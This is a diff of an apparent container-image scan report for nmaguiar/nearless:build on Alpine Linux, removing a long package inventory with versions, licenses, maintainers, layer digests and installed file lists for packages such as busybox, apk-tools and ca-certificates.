@@ -2,1081 +2,7 @@
 ╭ [0] ╭ Target         : nmaguiar/nearless:build (alpine 3.24.0_alpha20260127) 
 │     ├ Class          : os-pkgs 
 │     ├ Type           : alpine 
-│     ├ Packages        ╭ [0]  ╭ ID            : alpine-baselayout@3.7.1-r10 
-│     │                 │      ├ Name          : alpine-baselayout 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/alpine-baselayout@3.7.1-r10?arch=x86_64&
-│     │                 │      │                │       distro=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 4ce01e2964f2d95e 
-│     │                 │      ├ Version       : 3.7.1-r10 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : alpine-baselayout 
-│     │                 │      ├ SrcVersion    : 3.7.1-r10 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: alpine-baselayout-data@3.7.1-r10 
-│     │                 │      │                ╰ [1]: busybox-binsh@1.37.0-r31 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:2255799ccba3b867b6c849a8ebe096aed61381ed 
-│     │                 │      ├ InstalledFiles ╭ [0] : etc/motd 
-│     │                 │      │                ├ [1] : etc/crontabs/root 
-│     │                 │      │                ├ [2] : etc/modprobe.d/aliases.conf 
-│     │                 │      │                ├ [3] : etc/modprobe.d/blacklist.conf 
-│     │                 │      │                ├ [4] : etc/modprobe.d/i386.conf 
-│     │                 │      │                ├ [5] : etc/profile.d/20locale.sh 
-│     │                 │      │                ├ [6] : etc/profile.d/README 
-│     │                 │      │                ├ [7] : etc/profile.d/color_prompt.sh.disabled 
-│     │                 │      │                ├ [8] : usr/lib/sysctl.d/00-alpine.conf 
-│     │                 │      │                ├ [9] : var/lock 
-│     │                 │      │                ├ [10]: var/run 
-│     │                 │      │                ├ [11]: var/spool/mail 
-│     │                 │      │                ╰ [12]: var/spool/cron/crontabs 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [1]  ╭ ID            : alpine-baselayout-data@3.7.1-r10 
-│     │                 │      ├ Name          : alpine-baselayout-data 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/alpine-baselayout-data@3.7.1-r10?arch=x8
-│     │                 │      │                │       6_64&distro=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 6e5ecf6624f9956d 
-│     │                 │      ├ Version       : 3.7.1-r10 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : alpine-baselayout 
-│     │                 │      ├ SrcVersion    : 3.7.1-r10 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:bb63013361946fa69da63fe1be4c21bcc67c337b 
-│     │                 │      ├ InstalledFiles ╭ [0] : etc/fstab 
-│     │                 │      │                ├ [1] : etc/group 
-│     │                 │      │                ├ [2] : etc/hostname 
-│     │                 │      │                ├ [3] : etc/hosts 
-│     │                 │      │                ├ [4] : etc/inittab 
-│     │                 │      │                ├ [5] : etc/modules 
-│     │                 │      │                ├ [6] : etc/mtab 
-│     │                 │      │                ├ [7] : etc/nsswitch.conf 
-│     │                 │      │                ├ [8] : etc/passwd 
-│     │                 │      │                ├ [9] : etc/profile 
-│     │                 │      │                ├ [10]: etc/protocols 
-│     │                 │      │                ├ [11]: etc/services 
-│     │                 │      │                ├ [12]: etc/shadow 
-│     │                 │      │                ├ [13]: etc/shells 
-│     │                 │      │                ╰ [14]: etc/sysctl.conf 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [2]  ╭ ID            : alpine-keys@2.6-r0 
-│     │                 │      ├ Name          : alpine-keys 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/alpine-keys@2.6-r0?arch=x86_64&distro=3.
-│     │                 │      │                │       24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 2e9c406766e23b78 
-│     │                 │      ├ Version       : 2.6-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : alpine-keys 
-│     │                 │      ├ SrcVersion    : 2.6-r0 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:e2b0ee196494dc3874f853370dff9451e3bd91d7 
-│     │                 │      ├ InstalledFiles ╭ [0] : etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a084
-│     │                 │      │                │       0.rsa.pub 
-│     │                 │      │                ├ [1] : etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cec
-│     │                 │      │                │       b.rsa.pub 
-│     │                 │      │                ├ [2] : etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee5
-│     │                 │      │                │       9.rsa.pub 
-│     │                 │      │                ├ [3] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-4
-│     │                 │      │                │       a6a0840.rsa.pub 
-│     │                 │      │                ├ [4] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       243ef4b.rsa.pub 
-│     │                 │      │                ├ [5] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       24d27bb.rsa.pub 
-│     │                 │      │                ├ [6] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       261cecb.rsa.pub 
-│     │                 │      │                ├ [7] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       8199dcc.rsa.pub 
-│     │                 │      │                ├ [8] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       8cbb476.rsa.pub 
-│     │                 │      │                ├ [9] : usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       8e4f17d.rsa.pub 
-│     │                 │      │                ├ [10]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5
-│     │                 │      │                │       e69ca50.rsa.pub 
-│     │                 │      │                ├ [11]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       0ac2099.rsa.pub 
-│     │                 │      │                ├ [12]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       165ee59.rsa.pub 
-│     │                 │      │                ├ [13]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       1666e3f.rsa.pub 
-│     │                 │      │                ├ [14]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       16a9724.rsa.pub 
-│     │                 │      │                ├ [15]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       16abc23.rsa.pub 
-│     │                 │      │                ├ [16]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       16ac3bc.rsa.pub 
-│     │                 │      │                ├ [17]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       16adfeb.rsa.pub 
-│     │                 │      │                ├ [18]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       16ae350.rsa.pub 
-│     │                 │      │                ├ [19]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       16db30d.rsa.pub 
-│     │                 │      │                ├ [20]: usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6
-│     │                 │      │                │       6ba20fe.rsa.pub 
-│     │                 │      │                ├ [21]: usr/share/apk/keys/aarch64/alpine-devel@lists.alpinelin
-│     │                 │      │                │       ux.org-58199dcc.rsa.pub 
-│     │                 │      │                ├ [22]: usr/share/apk/keys/aarch64/alpine-devel@lists.alpinelin
-│     │                 │      │                │       ux.org-616ae350.rsa.pub 
-│     │                 │      │                ├ [23]: usr/share/apk/keys/armhf/alpine-devel@lists.alpinelinux
-│     │                 │      │                │       .org-524d27bb.rsa.pub 
-│     │                 │      │                ├ [24]: usr/share/apk/keys/armhf/alpine-devel@lists.alpinelinux
-│     │                 │      │                │       .org-616a9724.rsa.pub 
-│     │                 │      │                ├ [25]: usr/share/apk/keys/armv7/alpine-devel@lists.alpinelinux
-│     │                 │      │                │       .org-524d27bb.rsa.pub 
-│     │                 │      │                ├ [26]: usr/share/apk/keys/armv7/alpine-devel@lists.alpinelinux
-│     │                 │      │                │       .org-616adfeb.rsa.pub 
-│     │                 │      │                ├ [27]: usr/share/apk/keys/loongarch64/alpine-devel@lists.alpin
-│     │                 │      │                │       elinux.org-66ba20fe.rsa.pub 
-│     │                 │      │                ├ [28]: usr/share/apk/keys/mips64/alpine-devel@lists.alpinelinu
-│     │                 │      │                │       x.org-5e69ca50.rsa.pub 
-│     │                 │      │                ├ [29]: usr/share/apk/keys/ppc64le/alpine-devel@lists.alpinelin
-│     │                 │      │                │       ux.org-58cbb476.rsa.pub 
-│     │                 │      │                ├ [30]: usr/share/apk/keys/ppc64le/alpine-devel@lists.alpinelin
-│     │                 │      │                │       ux.org-616abc23.rsa.pub 
-│     │                 │      │                ├ [31]: usr/share/apk/keys/riscv64/alpine-devel@lists.alpinelin
-│     │                 │      │                │       ux.org-60ac2099.rsa.pub 
-│     │                 │      │                ├ [32]: usr/share/apk/keys/riscv64/alpine-devel@lists.alpinelin
-│     │                 │      │                │       ux.org-616db30d.rsa.pub 
-│     │                 │      │                ├ [33]: usr/share/apk/keys/s390x/alpine-devel@lists.alpinelinux
-│     │                 │      │                │       .org-58e4f17d.rsa.pub 
-│     │                 │      │                ├ [34]: usr/share/apk/keys/s390x/alpine-devel@lists.alpinelinux
-│     │                 │      │                │       .org-616ac3bc.rsa.pub 
-│     │                 │      │                ├ [35]: usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.o
-│     │                 │      │                │       rg-4a6a0840.rsa.pub 
-│     │                 │      │                ├ [36]: usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.o
-│     │                 │      │                │       rg-5243ef4b.rsa.pub 
-│     │                 │      │                ├ [37]: usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.o
-│     │                 │      │                │       rg-61666e3f.rsa.pub 
-│     │                 │      │                ├ [38]: usr/share/apk/keys/x86_64/alpine-devel@lists.alpinelinu
-│     │                 │      │                │       x.org-4a6a0840.rsa.pub 
-│     │                 │      │                ├ [39]: usr/share/apk/keys/x86_64/alpine-devel@lists.alpinelinu
-│     │                 │      │                │       x.org-5261cecb.rsa.pub 
-│     │                 │      │                ╰ [40]: usr/share/apk/keys/x86_64/alpine-devel@lists.alpinelinu
-│     │                 │      │                        x.org-6165ee59.rsa.pub 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [3]  ╭ ID            : alpine-release@3.24.0_alpha20260127-r0 
-│     │                 │      ├ Name          : alpine-release 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/alpine-release@3.24.0_alpha20260127-r0?a
-│     │                 │      │                │       rch=x86_64&distro=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : f31b7680b700b294 
-│     │                 │      ├ Version       : 3.24.0_alpha20260127-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : alpine-base 
-│     │                 │      ├ SrcVersion    : 3.24.0_alpha20260127-r0 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: alpine-keys@2.6-r0 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:76e6b86cdaf5b233b35bd94ba4ac0bc9bbeafd3e 
-│     │                 │      ├ InstalledFiles ╭ [0]: etc/alpine-release 
-│     │                 │      │                ├ [1]: etc/issue 
-│     │                 │      │                ├ [2]: etc/os-release 
-│     │                 │      │                ├ [3]: etc/secfixes.d/alpine 
-│     │                 │      │                ╰ [4]: usr/lib/os-release 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [4]  ╭ ID            : apk-tools@3.0.3-r2 
-│     │                 │      ├ Name          : apk-tools 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/apk-tools@3.0.3-r2?arch=x86_64&distro=3.
-│     │                 │      │                │       24.0_alpha20260127 
-│     │                 │      │                ╰ UID : e592157897973185 
-│     │                 │      ├ Version       : 3.0.3-r2 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : apk-tools 
-│     │                 │      ├ SrcVersion    : 3.0.3-r2 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: ca-certificates-bundle@20251003-r0 
-│     │                 │      │                ├ [1]: libapk@3.0.3-r2 
-│     │                 │      │                ├ [2]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ├ [3]: musl@1.2.5-r21 
-│     │                 │      │                ╰ [4]: zlib@1.3.1-r2 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:494bab63c552298ccc34f45c7ef05d1687e90e54 
-│     │                 │      ├ InstalledFiles ─ [0]: sbin/apk 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [5]  ╭ ID            : brotli-libs@1.2.0-r1 
-│     │                 │      ├ Name          : brotli-libs 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/brotli-libs@1.2.0-r1?arch=x86_64&distro=
-│     │                 │      │                │       3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : b24d50d76c0d90f 
-│     │                 │      ├ Version       : 1.2.0-r1 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : brotli 
-│     │                 │      ├ SrcVersion    : 1.2.0-r1 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : prspkt <prspkt@protonmail.com> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:19b3f6177ec81889b912c350c5fea4a2a666d805 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libbrotlicommon.so.1 
-│     │                 │      │                ├ [1]: usr/lib/libbrotlicommon.so.1.2.0 
-│     │                 │      │                ├ [2]: usr/lib/libbrotlidec.so.1 
-│     │                 │      │                ├ [3]: usr/lib/libbrotlidec.so.1.2.0 
-│     │                 │      │                ├ [4]: usr/lib/libbrotlienc.so.1 
-│     │                 │      │                ╰ [5]: usr/lib/libbrotlienc.so.1.2.0 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [6]  ╭ ID            : busybox@1.37.0-r31 
-│     │                 │      ├ Name          : busybox 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/busybox@1.37.0-r31?arch=x86_64&distro=3.
-│     │                 │      │                │       24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 35d639cf8472da48 
-│     │                 │      ├ Version       : 1.37.0-r31 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : busybox 
-│     │                 │      ├ SrcVersion    : 1.37.0-r31 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Sören Tempel <soeren+alpine@soeren-tempel.net> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:da5feffd3d293cadda41a516988f5d8e22e917e8 
-│     │                 │      ├ InstalledFiles ╭ [0]: bin/busybox 
-│     │                 │      │                ├ [1]: etc/securetty 
-│     │                 │      │                ├ [2]: etc/busybox-paths.d/busybox 
-│     │                 │      │                ├ [3]: etc/logrotate.d/acpid 
-│     │                 │      │                ├ [4]: etc/network/if-up.d/dad 
-│     │                 │      │                ├ [5]: etc/udhcpc/udhcpc.conf 
-│     │                 │      │                ╰ [6]: usr/share/udhcpc/default.script 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [7]  ╭ ID            : busybox-binsh@1.37.0-r31 
-│     │                 │      ├ Name          : busybox-binsh 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/busybox-binsh@1.37.0-r31?arch=x86_64&dis
-│     │                 │      │                │       tro=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : f8cc6e829f19edb2 
-│     │                 │      ├ Version       : 1.37.0-r31 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : busybox 
-│     │                 │      ├ SrcVersion    : 1.37.0-r31 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Sören Tempel <soeren+alpine@soeren-tempel.net> 
-│     │                 │      ├ DependsOn      ─ [0]: busybox@1.37.0-r31 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:4c3e2c012d65f1ac56e905b0d03d6af90bbf692b 
-│     │                 │      ├ InstalledFiles ─ [0]: bin/sh 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [8]  ╭ ID            : c-ares@1.34.6-r0 
-│     │                 │      ├ Name          : c-ares 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/c-ares@1.34.6-r0?arch=x86_64&distro=3.24
-│     │                 │      │                │       .0_alpha20260127 
-│     │                 │      │                ╰ UID : 5d569fd8e7aff848 
-│     │                 │      ├ Version       : 1.34.6-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : c-ares 
-│     │                 │      ├ SrcVersion    : 1.34.6-r0 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Carlo Landmeter <clandmeter@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:67d1948d07b29383e0ce2997bfdfa400f9804a3d 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libcares.so.2 
-│     │                 │      │                ╰ [1]: usr/lib/libcares.so.2.19.5 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [9]  ╭ ID            : ca-certificates@20260413-r0 
-│     │                 │      ├ Name          : ca-certificates 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/ca-certificates@20260413-r0?arch=x86_64&
-│     │                 │      │                │       distro=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : db63f38cf36e4502 
-│     │                 │      ├ Version       : 20260413-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : ca-certificates 
-│     │                 │      ├ SrcVersion    : 20260413-r0 
-│     │                 │      ├ Licenses       ╭ [0]: MPL-2.0 
-│     │                 │      │                ╰ [1]: MIT 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: busybox-binsh@1.37.0-r31 
-│     │                 │      │                ├ [1]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ╰ [2]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:b63f220f4e8f95279c961eab64186f719df3ebca 
-│     │                 │      ├ InstalledFiles ╭ [0]  : etc/ca-certificates.conf 
-│     │                 │      │                ├ [1]  : etc/apk/protected_paths.d/ca-certificates.list 
-│     │                 │      │                ├ [2]  : etc/ca-certificates/update.d/certhash 
-│     │                 │      │                ├ [3]  : usr/bin/c_rehash 
-│     │                 │      │                ├ [4]  : usr/sbin/update-ca-certificates 
-│     │                 │      │                ├ [5]  : usr/share/ca-certificates/mozilla/ACCVRAIZ1.crt 
-│     │                 │      │                ├ [6]  : usr/share/ca-certificates/mozilla/AC_RAIZ_FNMT-RCM.crt 
-│     │                 │      │                ├ [7]  : usr/share/ca-certificates/mozilla/AC_RAIZ_FNMT-RCM_SER
-│     │                 │      │                │        VIDORES_SEGUROS.crt 
-│     │                 │      │                ├ [8]  : usr/share/ca-certificates/mozilla/ANF_Secure_Server_Ro
-│     │                 │      │                │        ot_CA.crt 
-│     │                 │      │                ├ [9]  : usr/share/ca-certificates/mozilla/Actalis_Authenticati
-│     │                 │      │                │        on_Root_CA.crt 
-│     │                 │      │                ├ [10] : usr/share/ca-certificates/mozilla/AffirmTrust_Commerci
-│     │                 │      │                │        al.crt 
-│     │                 │      │                ├ [11] : usr/share/ca-certificates/mozilla/AffirmTrust_Networki
-│     │                 │      │                │        ng.crt 
-│     │                 │      │                ├ [12] : usr/share/ca-certificates/mozilla/AffirmTrust_Premium.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [13] : usr/share/ca-certificates/mozilla/AffirmTrust_Premium_
-│     │                 │      │                │        ECC.crt 
-│     │                 │      │                ├ [14] : usr/share/ca-certificates/mozilla/Amazon_Root_CA_1.crt 
-│     │                 │      │                ├ [15] : usr/share/ca-certificates/mozilla/Amazon_Root_CA_2.crt 
-│     │                 │      │                ├ [16] : usr/share/ca-certificates/mozilla/Amazon_Root_CA_3.crt 
-│     │                 │      │                ├ [17] : usr/share/ca-certificates/mozilla/Amazon_Root_CA_4.crt 
-│     │                 │      │                ├ [18] : usr/share/ca-certificates/mozilla/Atos_TrustedRoot_201
-│     │                 │      │                │        1.crt 
-│     │                 │      │                ├ [19] : usr/share/ca-certificates/mozilla/Atos_TrustedRoot_Roo
-│     │                 │      │                │        t_CA_ECC_TLS_2021.crt 
-│     │                 │      │                ├ [20] : usr/share/ca-certificates/mozilla/Atos_TrustedRoot_Roo
-│     │                 │      │                │        t_CA_RSA_TLS_2021.crt 
-│     │                 │      │                ├ [21] : usr/share/ca-certificates/mozilla/Autoridad_de_Certifi
-│     │                 │      │                │        cacion_Firmaprofesional_CIF_A62634068.crt 
-│     │                 │      │                ├ [22] : usr/share/ca-certificates/mozilla/BJCA_Global_Root_CA1
-│     │                 │      │                │        .crt 
-│     │                 │      │                ├ [23] : usr/share/ca-certificates/mozilla/BJCA_Global_Root_CA2
-│     │                 │      │                │        .crt 
-│     │                 │      │                ├ [24] : usr/share/ca-certificates/mozilla/Buypass_Class_2_Root
-│     │                 │      │                │        _CA.crt 
-│     │                 │      │                ├ [25] : usr/share/ca-certificates/mozilla/Buypass_Class_3_Root
-│     │                 │      │                │        _CA.crt 
-│     │                 │      │                ├ [26] : usr/share/ca-certificates/mozilla/CA_Disig_Root_R2.crt 
-│     │                 │      │                ├ [27] : usr/share/ca-certificates/mozilla/CFCA_EV_ROOT.crt 
-│     │                 │      │                ├ [28] : usr/share/ca-certificates/mozilla/COMODO_Certification
-│     │                 │      │                │        _Authority.crt 
-│     │                 │      │                ├ [29] : usr/share/ca-certificates/mozilla/COMODO_ECC_Certifica
-│     │                 │      │                │        tion_Authority.crt 
-│     │                 │      │                ├ [30] : usr/share/ca-certificates/mozilla/COMODO_RSA_Certifica
-│     │                 │      │                │        tion_Authority.crt 
-│     │                 │      │                ├ [31] : usr/share/ca-certificates/mozilla/Certainly_Root_E1.crt 
-│     │                 │      │                ├ [32] : usr/share/ca-certificates/mozilla/Certainly_Root_R1.crt 
-│     │                 │      │                ├ [33] : usr/share/ca-certificates/mozilla/Certigna.crt 
-│     │                 │      │                ├ [34] : usr/share/ca-certificates/mozilla/Certigna_Root_CA.crt 
-│     │                 │      │                ├ [35] : usr/share/ca-certificates/mozilla/Certum_EC-384_CA.crt 
-│     │                 │      │                ├ [36] : usr/share/ca-certificates/mozilla/Certum_Trusted_Netwo
-│     │                 │      │                │        rk_CA.crt 
-│     │                 │      │                ├ [37] : usr/share/ca-certificates/mozilla/Certum_Trusted_Netwo
-│     │                 │      │                │        rk_CA_2.crt 
-│     │                 │      │                ├ [38] : usr/share/ca-certificates/mozilla/Certum_Trusted_Root_
-│     │                 │      │                │        CA.crt 
-│     │                 │      │                ├ [39] : usr/share/ca-certificates/mozilla/D-TRUST_BR_Root_CA_1
-│     │                 │      │                │        _2020.crt 
-│     │                 │      │                ├ [40] : usr/share/ca-certificates/mozilla/D-TRUST_BR_Root_CA_2
-│     │                 │      │                │        _2023.crt 
-│     │                 │      │                ├ [41] : usr/share/ca-certificates/mozilla/D-TRUST_EV_Root_CA_1
-│     │                 │      │                │        _2020.crt 
-│     │                 │      │                ├ [42] : usr/share/ca-certificates/mozilla/D-TRUST_EV_Root_CA_2
-│     │                 │      │                │        _2023.crt 
-│     │                 │      │                ├ [43] : usr/share/ca-certificates/mozilla/D-TRUST_Root_Class_3
-│     │                 │      │                │        _CA_2_2009.crt 
-│     │                 │      │                ├ [44] : usr/share/ca-certificates/mozilla/D-TRUST_Root_Class_3
-│     │                 │      │                │        _CA_2_EV_2009.crt 
-│     │                 │      │                ├ [45] : usr/share/ca-certificates/mozilla/DigiCert_Assured_ID_
-│     │                 │      │                │        Root_CA.crt 
-│     │                 │      │                ├ [46] : usr/share/ca-certificates/mozilla/DigiCert_Assured_ID_
-│     │                 │      │                │        Root_G2.crt 
-│     │                 │      │                ├ [47] : usr/share/ca-certificates/mozilla/DigiCert_Assured_ID_
-│     │                 │      │                │        Root_G3.crt 
-│     │                 │      │                ├ [48] : usr/share/ca-certificates/mozilla/DigiCert_Global_Root
-│     │                 │      │                │        _CA.crt 
-│     │                 │      │                ├ [49] : usr/share/ca-certificates/mozilla/DigiCert_Global_Root
-│     │                 │      │                │        _G2.crt 
-│     │                 │      │                ├ [50] : usr/share/ca-certificates/mozilla/DigiCert_Global_Root
-│     │                 │      │                │        _G3.crt 
-│     │                 │      │                ├ [51] : usr/share/ca-certificates/mozilla/DigiCert_High_Assura
-│     │                 │      │                │        nce_EV_Root_CA.crt 
-│     │                 │      │                ├ [52] : usr/share/ca-certificates/mozilla/DigiCert_TLS_ECC_P38
-│     │                 │      │                │        4_Root_G5.crt 
-│     │                 │      │                ├ [53] : usr/share/ca-certificates/mozilla/DigiCert_TLS_RSA4096
-│     │                 │      │                │        _Root_G5.crt 
-│     │                 │      │                ├ [54] : usr/share/ca-certificates/mozilla/DigiCert_Trusted_Roo
-│     │                 │      │                │        t_G4.crt 
-│     │                 │      │                ├ [55] : usr/share/ca-certificates/mozilla/Entrust_Root_Certifi
-│     │                 │      │                │        cation_Authority.crt 
-│     │                 │      │                ├ [56] : usr/share/ca-certificates/mozilla/Entrust_Root_Certifi
-│     │                 │      │                │        cation_Authority_-_EC1.crt 
